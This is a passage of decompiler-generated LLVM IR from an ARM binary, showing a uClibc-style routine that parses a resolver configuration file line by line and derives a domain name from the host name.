  store i32 %v5_1cc38, i32* %v4_1cc38, align 4
  %v6_1cc38 = add i32 %v0_1cc2c, 24
  %v7_1cc38 = inttoptr i32 %v6_1cc38 to i32*
  %v8_1cc38 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1cc38, i32* %v7_1cc38, align 4
  %v0_1cc3c = load i32, i32* %r4.global-to-local, align 4
  %v1_1cc3c = load i32, i32* @r5, align 4
  %v2_1cc3c = load i32, i32* @r7, align 4
  %v3_1cc3c = add i32 %v2_1cc3c, %v1_1cc3c
  %v4_1cc3c = inttoptr i32 %v3_1cc3c to i32*
  store i32 %v0_1cc3c, i32* %v4_1cc3c, align 4
  br label %dec_label_pc_1cdb8.backedge

dec_label_pc_1cdb8.backedge:                      ; preds = %dec_label_pc_1cce0, %dec_label_pc_1ccd0, %dec_label_pc_1cc9c, %dec_label_pc_1cc18, %dec_label_pc_1cd70, %dec_label_pc_1cbc4, %dec_label_pc_1cbe0, %dec_label_pc_1cd18, %dec_label_pc_1cd20, %dec_label_pc_1cd04, %dec_label_pc_1cd54
  %v0_1cdc4.pre = load i32, i32* @fp, align 4
  store i32 %v2_1cdb8, i32* @r4, align 4
  store i32 %v2_1cdb8, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v0_1cdc4.pre, i32* %r2.global-to-local, align 4
  %v3_1cdc8 = call i32 @fgets(i32 %v2_1cdb8, i32 128, i32 %v0_1cdc4.pre)
  store i32 %v3_1cdc8, i32* %r0.global-to-local, align 4
  %v2_1cdcc = icmp eq i32 %v3_1cdc8, 0
  br i1 %v2_1cdcc, label %dec_label_pc_1cdd4, label %dec_label_pc_1cb5c

dec_label_pc_1cc44:                               ; preds = %dec_label_pc_1cb5c
  %v0_1cc44 = load i32, i32* @r4, align 4
  store i32 %v0_1cc44, i32* %r0.global-to-local, align 4
  store i32 %v2_1cd94, i32* @r1, align 4
  %v2_1cc4c = inttoptr i32 %v0_1cc44 to i8*
  %v3_1cc4c = call i32 @__GI_strcoll(i8* %v2_1cc4c, i32 %v2_1cd94)
  store i32 %v3_1cc4c, i32* %r0.global-to-local, align 4
  %v2_1cc50 = icmp eq i32 %v3_1cc4c, 0
  br i1 %v2_1cc50, label %dec_label_pc_1cc84, label %dec_label_pc_1cc58

dec_label_pc_1cc58:                               ; preds = %dec_label_pc_1cc44
  %v0_1cc58 = load i32, i32* @r4, align 4
  store i32 %v0_1cc58, i32* %r0.global-to-local, align 4
  store i32 %v2_1cda0, i32* @r1, align 4
  %v2_1cc60 = inttoptr i32 %v0_1cc58 to i8*
  %v3_1cc60 = call i32 @__GI_strcoll(i8* %v2_1cc60, i32 %v2_1cda0)
  store i32 %v3_1cc60, i32* %r0.global-to-local, align 4
  %v2_1cc64 = icmp eq i32 %v3_1cc60, 0
  br i1 %v2_1cc64, label %dec_label_pc_1cc84, label %dec_label_pc_1cd04

dec_label_pc_1cc70:                               ; preds = %dec_label_pc_1cc84, %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge
  %v2_1cc74 = phi i32 [ %v1_1cc88, %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge ], [ %v1_1cc8810, %dec_label_pc_1cc84 ]
  %v0_1cc74 = phi i32 [ %v1_1cc90, %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge ], [ %v1_1cc9017, %dec_label_pc_1cc84 ]
  %v1_1cc70 = phi i32 [ %v1_1cc70.pre, %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge ], [ 27496, %dec_label_pc_1cc84 ]
  %v1_1cc74 = phi i32 [ %v0_1cc88, %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge ], [ %v0_1cc889, %dec_label_pc_1cc84 ]
  %v2_1cc70 = add i32 %v1_1cc74, %v1_1cc70
  %v3_1cc70 = inttoptr i32 %v2_1cc70 to i32*
  %v4_1cc70 = load i32, i32* %v3_1cc70, align 4
  store i32 %v4_1cc70, i32* %r3.global-to-local, align 4
  %v3_1cc74 = add i32 %v1_1cc74, %v2_1cc74
  %v4_1cc74 = inttoptr i32 %v3_1cc74 to i32*
  store i32 %v0_1cc74, i32* %v4_1cc74, align 4
  %v0_1cc78 = load i32, i32* %r3.global-to-local, align 4
  %v1_1cc78 = load i32, i32* %r2.global-to-local, align 4
  %v4_1cc78 = mul i32 %v1_1cc78, 4
  %v5_1cc78 = add i32 %v4_1cc78, %v0_1cc78
  %v6_1cc78 = inttoptr i32 %v5_1cc78 to i32*
  %v7_1cc78 = load i32, i32* %v6_1cc78, align 4
  store i32 %v7_1cc78, i32* @r0, align 4
  %v0_1cc7c = call i32 @free()
  store i32 %v0_1cc7c, i32* %r0.global-to-local, align 4
  %v0_1cc88 = load i32, i32* @r5, align 4
  %v1_1cc88 = load i32, i32* @sb, align 4
  %v2_1cc88 = add i32 %v1_1cc88, %v0_1cc88
  %v3_1cc88 = inttoptr i32 %v2_1cc88 to i32*
  %v4_1cc88 = load i32, i32* %v3_1cc88, align 4
  store i32 %v4_1cc88, i32* %r3.global-to-local, align 4
  %v2_1cc8c = icmp eq i32 %v4_1cc88, 0
  %v1_1cc90 = add i32 %v4_1cc88, -1
  store i32 %v1_1cc90, i32* %r2.global-to-local, align 4
  br i1 %v2_1cc8c, label %dec_label_pc_1cc98, label %dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge

dec_label_pc_1cc70.dec_label_pc_1cc70_crit_edge:  ; preds = %dec_label_pc_1cc70
  %v1_1cc70.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1cc70

dec_label_pc_1cc84:                               ; preds = %dec_label_pc_1cc58, %dec_label_pc_1cc44
  store i32 27496, i32* @r4, align 4
  %v0_1cc889 = load i32, i32* @r5, align 4
  %v1_1cc8810 = load i32, i32* @sb, align 4
  %v2_1cc8811 = add i32 %v1_1cc8810, %v0_1cc889
  %v3_1cc8812 = inttoptr i32 %v2_1cc8811 to i32*
  %v4_1cc8813 = load i32, i32* %v3_1cc8812, align 4
  store i32 %v4_1cc8813, i32* %r3.global-to-local, align 4
  %v2_1cc8c15 = icmp eq i32 %v4_1cc8813, 0
  %v1_1cc9017 = add i32 %v4_1cc8813, -1
  store i32 %v1_1cc9017, i32* %r2.global-to-local, align 4
  br i1 %v2_1cc8c15, label %dec_label_pc_1cc98, label %dec_label_pc_1cc70

dec_label_pc_1cc98:                               ; preds = %dec_label_pc_1cc70, %dec_label_pc_1cc84
  store i32 27496, i32* @r6, align 4
  br label %dec_label_pc_1cc9c

dec_label_pc_1cc9c:                               ; preds = %dec_label_pc_1cce0, %dec_label_pc_1cc98
  %v0_1cc9c = load i32, i32* @r7, align 4
  store i32 %v0_1cc9c, i32* %r0.global-to-local, align 4
  %v0_1cca0 = call i32 @skip_nospace()
  store i32 %v0_1cca0, i32* %r0.global-to-local, align 4
  %v1_1cca4 = inttoptr i32 %v0_1cca0 to i8*
  %v2_1cca4 = call i32 @skip_and_NUL_space(i8* %v1_1cca4)
  store i32 %v2_1cca4, i32* %r0.global-to-local, align 4
  %v0_1cca8 = load i32, i32* @r5, align 4
  %v1_1cca8 = load i32, i32* @sb, align 4
  %v2_1cca8 = add i32 %v1_1cca8, %v0_1cca8
  %v3_1cca8 = inttoptr i32 %v2_1cca8 to i32*
  %v4_1cca8 = load i32, i32* %v3_1cca8, align 4
  store i32 %v2_1cca4, i32* @r4, align 4
  %tmp69 = mul i32 %v4_1cca8, 4
  %v3_1ccb4 = add i32 %tmp69, 4
  store i32 %v3_1ccb4, i32* %r1.global-to-local, align 4
  %v1_1ccb8 = load i32, i32* @r6, align 4
  %v2_1ccb8 = add i32 %v1_1ccb8, %v0_1cca8
  %v3_1ccb8 = inttoptr i32 %v2_1ccb8 to i32*
  %v4_1ccb8 = load i32, i32* %v3_1ccb8, align 4
  store i32 %v4_1ccb8, i32* %r0.global-to-local, align 4
  %v2_1ccbc = inttoptr i32 %v4_1ccb8 to i32*
  %v3_1ccbc = call i32 @realloc(i32* %v2_1ccbc, i32 %v3_1ccb4)
  store i32 %v3_1ccbc, i32* %r3.global-to-local, align 4
  %v2_1ccc0 = icmp eq i32 %v3_1ccbc, 0
  %v0_1ccc4 = load i32, i32* @r7, align 4
  store i32 %v0_1ccc4, i32* %r0.global-to-local, align 4
  %v0_1ccc8 = load i32, i32* @r4, align 4
  store i32 %v0_1ccc8, i32* @r7, align 4
  br i1 %v2_1ccc0, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1ccd0

dec_label_pc_1ccd0:                               ; preds = %dec_label_pc_1cc9c
  %v1_1ccd0 = load i32, i32* @r5, align 4
  %v2_1ccd0 = load i32, i32* @r6, align 4
  %v3_1ccd0 = add i32 %v2_1ccd0, %v1_1ccd0
  %v4_1ccd0 = inttoptr i32 %v3_1ccd0 to i32*
  store i32 %v3_1ccbc, i32* %v4_1ccd0, align 4
  %v1_1ccd4 = inttoptr i32 %v0_1ccc4 to i8*
  %v2_1ccd4 = call i32 @__GI_strdup(i8* %v1_1ccd4)
  store i32 %v2_1ccd4, i32* %r0.global-to-local, align 4
  %v2_1ccd8 = icmp eq i32 %v2_1ccd4, 0
  br i1 %v2_1ccd8, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cce0

dec_label_pc_1cce0:                               ; preds = %dec_label_pc_1ccd0
  %v0_1cce0 = load i32, i32* @r5, align 4
  %v1_1cce0 = load i32, i32* @sb, align 4
  %v2_1cce0 = add i32 %v1_1cce0, %v0_1cce0
  %v3_1cce0 = inttoptr i32 %v2_1cce0 to i32*
  %v4_1cce0 = load i32, i32* %v3_1cce0, align 4
  store i32 %v4_1cce0, i32* %r3.global-to-local, align 4
  %v1_1cce4 = load i32, i32* @r6, align 4
  %v2_1cce4 = add i32 %v1_1cce4, %v0_1cce0
  %v3_1cce4 = inttoptr i32 %v2_1cce4 to i32*
  %v4_1cce4 = load i32, i32* %v3_1cce4, align 4
  store i32 %v4_1cce4, i32* %r2.global-to-local, align 4
  %v1_1cce8 = add i32 %v4_1cce0, 1
  store i32 %v1_1cce8, i32* %r1.global-to-local, align 4
  %v5_1ccec = mul i32 %v4_1cce0, 4
  %v6_1ccec = add i32 %v4_1cce4, %v5_1ccec
  %v7_1ccec = inttoptr i32 %v6_1ccec to i32*
  store i32 %v2_1ccd4, i32* %v7_1ccec, align 4
  %v0_1ccf0 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ccf0 = load i32, i32* @r5, align 4
  %v2_1ccf0 = load i32, i32* @sb, align 4
  %v3_1ccf0 = add i32 %v2_1ccf0, %v1_1ccf0
  %v4_1ccf0 = inttoptr i32 %v3_1ccf0 to i32*
  store i32 %v0_1ccf0, i32* %v4_1ccf0, align 4
  %v0_1ccf4 = load i32, i32* @r4, align 4
  %v1_1ccf4 = inttoptr i32 %v0_1ccf4 to i8*
  %v2_1ccf4 = load i8, i8* %v1_1ccf4, align 1
  %v3_1ccf4 = zext i8 %v2_1ccf4 to i32
  store i32 %v3_1ccf4, i32* %r3.global-to-local, align 4
  %v2_1ccf8 = icmp eq i8 %v2_1ccf4, 0
  br i1 %v2_1ccf8, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cc9c

dec_label_pc_1cd04:                               ; preds = %dec_label_pc_1cc58
  %v0_1cd04 = load i32, i32* @r4, align 4
  store i32 %v0_1cd04, i32* %r0.global-to-local, align 4
  %v2_1cd08 = load i32, i32* %stack_var_-560, align 4
  store i32 %v2_1cd08, i32* @r1, align 4
  %v2_1cd0c = inttoptr i32 %v0_1cd04 to i8*
  %v3_1cd0c = call i32 @__GI_strcoll(i8* %v2_1cd0c, i32 %v2_1cd08)
  store i32 %v3_1cd0c, i32* %r0.global-to-local, align 4
  %sext2 = mul i32 %v3_1cd0c, 16777216
  %v1_1cd10 = sdiv i32 %sext2, 16777216
  store i32 %v1_1cd10, i32* @r4, align 4
  %sext2.off = or i32 %sext2, 16777215
  %tmp70 = icmp ult i32 %sext2.off, 33554431
  br i1 %tmp70, label %dec_label_pc_1cd18, label %dec_label_pc_1cdb8.backedge

dec_label_pc_1cd18:                               ; preds = %dec_label_pc_1cd04
  %v0_1cd18 = load i32, i32* @r7, align 4
  %v2_1cd18 = icmp eq i32 %v0_1cd18, 0
  br i1 %v2_1cd18, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cd20

dec_label_pc_1cd20:                               ; preds = %dec_label_pc_1cd18
  store i32 %v0_1cd18, i32* @r0, align 4
  store i32 58, i32* %r1.global-to-local, align 4
  %v2_1cd28 = call i32 @__GI_strchr(i32 %v0_1cd18, i32 58)
  store i32 %v2_1cd28, i32* %r0.global-to-local, align 4
  store i32 %v2_1cd28, i32* @r6, align 4
  %v3_1cd2c = icmp eq i32 %v2_1cd28, 0
  br i1 %v3_1cd2c, label %dec_label_pc_1cdb8.backedge, label %dec_label_pc_1cd34

dec_label_pc_1cd34:                               ; preds = %dec_label_pc_1cd20
  store i32 -34280, i32* %r1.global-to-local, align 4
  %v0_1cd38 = load i32, i32* @r4, align 4
  %v1_1cd38 = trunc i32 %v0_1cd38 to i8
  %v3_1cd38 = inttoptr i32 %v2_1cd28 to i8*
  store i8 %v1_1cd38, i8* %v3_1cd38, align 1
  %v0_1cd3c = load i32, i32* @r5, align 4
  %v1_1cd3c = load i32, i32* %r1.global-to-local, align 4
  %v2_1cd3c = add i32 %v1_1cd3c, %v0_1cd3c
  store i32 %v2_1cd3c, i32* @r1, align 4
  %v0_1cd40 = load i32, i32* @r7, align 4
  store i32 %v0_1cd40, i32* %r0.global-to-local, align 4
  %v2_1cd44 = inttoptr i32 %v0_1cd40 to i8*
  %v3_1cd44 = call i32 @__GI_strcoll(i8* %v2_1cd44, i32 %v2_1cd3c)
  store i32 %v3_1cd44, i32* %r0.global-to-local, align 4
  %v2_1cd48 = icmp eq i32 %v3_1cd44, 0
  br i1 %v2_1cd48, label %dec_label_pc_1cd70, label %dec_label_pc_1cd54

dec_label_pc_1cd54:                               ; preds = %dec_label_pc_1cd34
  %v0_1cd58 = load i32, i32* @r7, align 4
  store i32 %v0_1cd58, i32* %r0.global-to-local, align 4
  %v0_1cd5c = load i32, i32* @r5, align 4
  %v2_1cd5c = add i32 %v0_1cd5c, -34272
  store i32 %v2_1cd5c, i32* @r1, align 4
  %v2_1cd60 = inttoptr i32 %v0_1cd58 to i8*
  %v3_1cd60 = call i32 @__GI_strcoll(i8* %v2_1cd60, i32 %v2_1cd5c)
  store i32 %v3_1cd60, i32* %r0.global-to-local, align 4
  %v2_1cd64 = icmp eq i32 %v3_1cd60, 0
  br i1 %v2_1cd64, label %dec_label_pc_1cd70, label %dec_label_pc_1cdb8.backedge

dec_label_pc_1cd70:                               ; preds = %dec_label_pc_1cd54, %dec_label_pc_1cd34
  %storemerge = phi i32 [ 1274, %dec_label_pc_1cd34 ], [ 1275, %dec_label_pc_1cd54 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v0_1cd70 = load i32, i32* @r6, align 4
  %v1_1cd70 = add i32 %v0_1cd70, 1
  store i32 %v1_1cd70, i32* @r0, align 4
  %v0_1cd74 = load i32, i32* @r5, align 4
  %v2_1cd74 = add i32 %v0_1cd74, %storemerge
  store i32 %v2_1cd74, i32* @r4, align 4
  %v1_1cd78 = call i32 @atol(i32 %v1_1cd70)
  %v2_1cd78 = trunc i32 %v1_1cd78 to i8
  store i32 %v1_1cd78, i32* %r0.global-to-local, align 4
  %v3_1cd7c = load i32, i32* @r4, align 4
  %v4_1cd7c = inttoptr i32 %v3_1cd7c to i8*
  store i8 %v2_1cd78, i8* %v4_1cd7c, align 1
  br label %dec_label_pc_1cdb8.backedge

dec_label_pc_1cd84:                               ; preds = %dec_label_pc_1cb24
  %v0_1cd88 = load i32, i32* @r5, align 4
  %v2_1cd88 = add i32 %v0_1cd88, -34316
  %v2_1cd94 = add i32 %v0_1cd88, -34304
  %v2_1cda0 = add i32 %v0_1cd88, -34296
  %v2_1cdac = add i32 %v0_1cd88, -34288
  store i32 %v2_1cdac, i32* %r3.global-to-local, align 4
  store i32 27508, i32* @sb, align 4
  store i32 %v2_1cdac, i32* %stack_var_-560, align 4
  %v2_1cdb8 = ptrtoint i32* %stack_var_-288 to i32
  %v1_1cb60 = bitcast i32* %stack_var_-288 to i8*
  %v2_1cb90 = ptrtoint i16* %stack_var_-68 to i32
  %v2_1cba4 = bitcast i16* %stack_var_-68 to i8*
  %v2_1cbb0 = ptrtoint i32* %stack_var_-60 to i32
  %v2_1cbc8 = ptrtoint i32* %stack_var_-64 to i32
  %v2_1cbe0 = ptrtoint i32* %stack_var_-304 to i32
  %v14_1cc24 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1cdb8, i32* @r4, align 4
  store i32 %v2_1cdb8, i32* %r0.global-to-local, align 4
  store i32 128, i32* %r1.global-to-local, align 4
  store i32 %v2_1cb4c, i32* %r2.global-to-local, align 4
  %v3_1cdc866 = call i32 @fgets(i32 %v2_1cdb8, i32 128, i32 %v2_1cb4c)
  store i32 %v3_1cdc866, i32* %r0.global-to-local, align 4
  %v2_1cdcc68 = icmp eq i32 %v3_1cdc866, 0
  br i1 %v2_1cdcc68, label %dec_label_pc_1cdd4, label %dec_label_pc_1cb5c

dec_label_pc_1cdd4:                               ; preds = %dec_label_pc_1cdb8.backedge, %dec_label_pc_1cd84
  %v0_1cdd4 = load i32, i32* @fp, align 4
  store i32 %v0_1cdd4, i32* %r0.global-to-local, align 4
  %v1_1cdd8 = inttoptr i32 %v0_1cdd4 to i16*
  %v2_1cdd8 = call i32 @__GI_fclose(i16* %v1_1cdd8)
  store i32 %v2_1cdd8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cddc

dec_label_pc_1cddc:                               ; preds = %dec_label_pc_1cb24, %dec_label_pc_1cdd4
  store i32 27504, i32* %r3.global-to-local, align 4
  %v0_1cde0 = load i32, i32* @r5, align 4
  %v2_1cde0 = add i32 %v0_1cde0, 27504
  %v3_1cde0 = inttoptr i32 %v2_1cde0 to i32*
  %v4_1cde0 = load i32, i32* %v3_1cde0, align 4
  store i32 %v4_1cde0, i32* %r3.global-to-local, align 4
  %v2_1cde4 = icmp eq i32 %v4_1cde0, 0
  br i1 %v2_1cde4, label %dec_label_pc_1cdec, label %dec_label_pc_1ce28

dec_label_pc_1cdec:                               ; preds = %dec_label_pc_1cddc
  store i32 28, i32* %r0.global-to-local, align 4
  %v1_1cdf0 = call i32 @malloc(i32 28)
  store i32 %v1_1cdf0, i32* %r0.global-to-local, align 4
  store i32 -34260, i32* %r3.global-to-local, align 4
  store i32 27500, i32* %r2.global-to-local, align 4
  %v2_1cdfc = icmp eq i32 %v1_1cdf0, 0
  %v1_1ce00 = load i32, i32* @r5, align 4
  br i1 %v2_1cdfc, label %bb62, label %bb63

bb62:                                             ; preds = %dec_label_pc_1cdec
  %v3_1ce00 = add i32 %v1_1ce00, -34260
  store i32 %v3_1ce00, i32* %r3.global-to-local, align 4
  %v3_1ce0428 = add i32 %v1_1ce00, 27500
  %v4_1ce0429 = inttoptr i32 %v3_1ce0428 to i32*
  store i32 0, i32* %v4_1ce0429, align 4
  %v1_1ce08 = load i32, i32* %r3.global-to-local, align 4
  %v2_1ce08 = load i32, i32* @r5, align 4
  %v3_1ce08 = load i32, i32* %r2.global-to-local, align 4
  %v4_1ce08 = add i32 %v3_1ce08, %v2_1ce08
  %v5_1ce08 = inttoptr i32 %v4_1ce08 to i32*
  store i32 %v1_1ce08, i32* %v5_1ce08, align 4
  br label %.thread4

bb63:                                             ; preds = %dec_label_pc_1cdec
  %v3_1ce04 = add i32 %v1_1ce00, 27500
  %v4_1ce04 = inttoptr i32 %v3_1ce04 to i32*
  store i32 %v1_1cdf0, i32* %v4_1ce04, align 4
  %v1_1ce0c = load i32, i32* @r5, align 4
  %v2_1ce0c = load i32, i32* %r3.global-to-local, align 4
  %v3_1ce0c = add i32 %v2_1ce0c, %v1_1ce0c
  store i32 %v3_1ce0c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %bb62, %bb63
  store i32 118296, i32* @lr, align 4
  %v1_1ce14 = xor i1 %v2_1cdfc, true
  call void @__pseudo_cond_branch(i1 %v1_1ce14, i32 ptrtoint (i32* @global_var_15270.1094 to i32))
  store i32 27504, i32* %r2.global-to-local, align 4
  %v0_1ce1c = load i32, i32* @r5, align 4
  %v2_1ce1c = add i32 %v0_1ce1c, 27504
  %v3_1ce1c = inttoptr i32 %v2_1ce1c to i32*
  %v4_1ce1c = load i32, i32* %v3_1ce1c, align 4
  %v1_1ce20 = add i32 %v4_1ce1c, 1
  store i32 %v1_1ce20, i32* %r3.global-to-local, align 4
  store i32 %v1_1ce20, i32* %v3_1ce1c, align 4
  %v0_1ce2c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ce28

dec_label_pc_1ce28:                               ; preds = %dec_label_pc_1cddc, %.thread4
  %v0_1ce2c = phi i32 [ %v0_1cde0, %dec_label_pc_1cddc ], [ %v0_1ce2c.pre, %.thread4 ]
  store i32 27508, i32* @r7, align 4
  %v2_1ce2c = add i32 %v0_1ce2c, 27508
  %v3_1ce2c = inttoptr i32 %v2_1ce2c to i32*
  %v4_1ce2c = load i32, i32* %v3_1ce2c, align 4
  store i32 %v4_1ce2c, i32* @r4, align 4
  %v2_1ce30 = icmp eq i32 %v4_1ce2c, 0
  br i1 %v2_1ce30, label %dec_label_pc_1ce38, label %dec_label_pc_1ceb8

dec_label_pc_1ce38:                               ; preds = %dec_label_pc_1ce28
  %v2_1ce38 = ptrtoint i32* %stack_var_-544 to i32
  store i32 %v2_1ce38, i32* @r6, align 4
  store i32 %v2_1ce38, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_1ce44 = call i32 @__GI_gethostname(i32 %v2_1ce38, i32 255)
  store i32 %v2_1ce44, i32* %r0.global-to-local, align 4
  %v2_1ce48 = icmp eq i32 %v2_1ce44, 0
  br i1 %v2_1ce48, label %dec_label_pc_1ce54, label %dec_label_pc_1ceb8

dec_label_pc_1ce54:                               ; preds = %dec_label_pc_1ce38
  store i32 %v2_1ce38, i32* @r0, align 4
  store i32 46, i32* %r1.global-to-local, align 4
  %v2_1ce5c = call i32 @__GI_strchr(i32 %v2_1ce38, i32 46)
  store i32 %v2_1ce5c, i32* %r0.global-to-local, align 4
  %v2_1ce60 = icmp eq i32 %v2_1ce5c, 0
  br i1 %v2_1ce60, label %dec_label_pc_1ceb8, label %dec_label_pc_1ce68

dec_label_pc_1ce68:                               ; preds = %dec_label_pc_1ce54
  %v1_1ce68 = add i32 %v2_1ce5c, 1
  %v2_1ce68 = inttoptr i32 %v1_1ce68 to i8*
  %v3_1ce68 = load i8, i8* %v2_1ce68, align 1
  %v4_1ce68 = zext i8 %v3_1ce68 to i32
  store i32 %v4_1ce68, i32* %r3.global-to-local, align 4
  %v2_1ce6c = icmp eq i8 %v3_1ce68, 0
  store i32 %v1_1ce68, i32* %r0.global-to-local, align 4
  br i1 %v2_1ce6c, label %dec_label_pc_1ceb8, label %dec_label_pc_1ce78

dec_label_pc_1ce78:                               ; preds = %dec_label_pc_1ce68
  %v2_1ce78 = call i32 @__GI_strdup(i8* %v2_1ce68)
  store i32 %v2_1ce78, i32* %r0.global-to-local, align 4
  store i32 %v2_1ce78, i32* @r4, align 4
  %v2_1ce7c = icmp eq i32 %v2_1ce78, 0
  br i1 %v2_1ce7c, label %dec_label_pc_1ceb8, label %dec_label_pc_1ce84

dec_label_pc_1ce84:                               ; preds = %dec_label_pc_1ce78
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_1ce88 = call i32 @malloc(i32 4)
  store i32 %v1_1ce88, i32* %r0.global-to-local, align 4
  store i32 27496, i32* %r3.global-to-local, align 4
  %v2_1ce90 = icmp eq i32 %v1_1ce88, 0
  %v1_1ce94 = load i32, i32* @r5, align 4
  %v3_1ce94 = add i32 %v1_1ce94, 27496
  %v4_1ce94 = inttoptr i32 %v3_1ce94 to i32*
  store i32 %v1_1ce88, i32* %v4_1ce94, align 4
  br i1 %v2_1ce90, label %dec_label_pc_1ce9c, label %dec_label_pc_1cea8

dec_label_pc_1ce9c:                               ; preds = %dec_label_pc_1ce84
  %v0_1ce9c = load i32, i32* @r4, align 4
  store i32 %v0_1ce9c, i32* @r0, align 4
  %v0_1cea0 = call i32 @free()
  store i32 %v0_1cea0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1ceb8

dec_label_pc_1cea8:                               ; preds = %dec_label_pc_1ce84
  %v0_1cea8 = load i32, i32* @r5, align 4
  %v1_1cea8 = load i32, i32* @r7, align 4
  %v2_1cea8 = add i32 %v1_1cea8, %v0_1cea8
  %v3_1cea8 = inttoptr i32 %v2_1cea8 to i32*
  %v4_1cea8 = load i32, i32* %v3_1cea8, align 4
  %v1_1ceac = add i32 %v4_1cea8, 1
  store i32 %v1_1ceac, i32* %r3.global-to-local, align 4
  %v0_1ceb0 = load i32, i32* @r4, align 4
  %v2_1ceb0 = inttoptr i32 %v1_1ce88 to i32*
  store i32 %v0_1ceb0, i32* %v2_1ceb0, align 4
  %v0_1ceb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ceb4 = load i32, i32* @r5, align 4
  %v2_1ceb4 = load i32, i32* @r7, align 4
  %v3_1ceb4 = add i32 %v2_1ceb4, %v1_1ceb4
  %v4_1ceb4 = inttoptr i32 %v3_1ceb4 to i32*
  store i32 %v0_1ceb4, i32* %v4_1ceb4, align 4
  br label %dec_label_pc_1ceb8

dec_label_pc_1ceb8:                               ; preds = %dec_label_pc_1ce38, %dec_label_pc_1ce28, %dec_label_pc_1cb14, %dec_label_pc_1ce78, %dec_label_pc_1ce68, %dec_label_pc_1ce54, %dec_label_pc_1ce9c, %dec_label_pc_1cea8
  store i32 27492, i32* %r3.global-to-local, align 4
  %v0_1cebc = load i32, i32* @r5, align 4
  %v2_1cebc = add i32 %v0_1cebc, 27492
  %v3_1cebc = inttoptr i32 %v2_1cebc to i32*
  %v4_1cebc = load i32, i32* %v3_1cebc, align 4
  store i32 %v4_1cebc, i32* %r0.global-to-local, align 4
  %v2_1cec0 = icmp eq i32 %v4_1cebc, 0
  br i1 %v2_1cec0, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_1ceb8
  store i32 118476, i32* %lr.global-to-local, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_1ceb8, %bb64
  %v2_1cec8 = xor i1 %v2_1cec0, true
  call void @__pseudo_cond_branch(i1 %v2_1cec8, i32 %v4_1cebc)
  %v2_1ced0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1ced0, i32* %r4.global-to-local, align 4
  store i32 %v15_1cac4, i32* @r8, align 4
  store i32 %v18_1cac4, i32* @sb, align 4
  store i32 %v21_1cac4, i32* @sl, align 4
  store i32 %v24_1cac4, i32* @fp, align 4
  store i32 %v27_1cac4, i32* %lr.global-to-local, align 4
  ret i32 %v4_1cebc

; uselistorder directives
  uselistorder i32 %v1_1ce88, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1ce38, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1cbc8, { 1, 0 }
  uselistorder i32 %v2_1cbb0, { 1, 0 }
  uselistorder i32 %v2_1cb90, { 1, 0 }
  uselistorder i32 %v2_1cdb8, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %v0_1cd88, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1cd78, { 1, 0 }
  uselistorder i32 %v0_1cd18, { 1, 0, 2 }
  uselistorder i32 %v1_1cc9017, { 1, 0 }
  uselistorder i32 %v1_1cc8810, { 1, 0 }
  uselistorder i32 %v0_1cc889, { 1, 0 }
  uselistorder i32 %v1_1cc90, { 1, 0 }
  uselistorder i32 %v3_1cc0c, { 1, 0, 2, 3, 4 }
  uselistorder i16* %stack_var_-68, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 7, 8, 10, 11, 12, 23, 0, 13, 14, 15, 22, 18, 16, 17, 19, 20, 21, 24, 25, 26, 27, 28 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 17, 5, 0, 7, 6, 14, 8, 9, 10, 11, 12, 13, 15, 16 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 21, 3, 4, 5, 6, 7, 8, 16, 9, 10, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 56, 55, 13, 15, 14, 17, 16, 18, 20, 19, 22, 21, 23, 24, 26, 25, 27, 29, 28, 34, 33, 49, 48, 30, 31, 32, 36, 35, 38, 37, 39, 41, 40, 42, 44, 43, 45, 47, 46, 52, 50, 51, 54, 53 }
  uselistorder i32 (i16*)* @__GI_fclose, { 4, 3, 0, 1, 2 }
  uselistorder i32 (i32)* @atol, { 0, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 58, { 0, 5, 4, 6, 1, 2, 3, 7 }
  uselistorder i32 (i32*, i32)* @realloc, { 2, 3, 1, 0 }
  uselistorder i16 2, { 1, 0 }
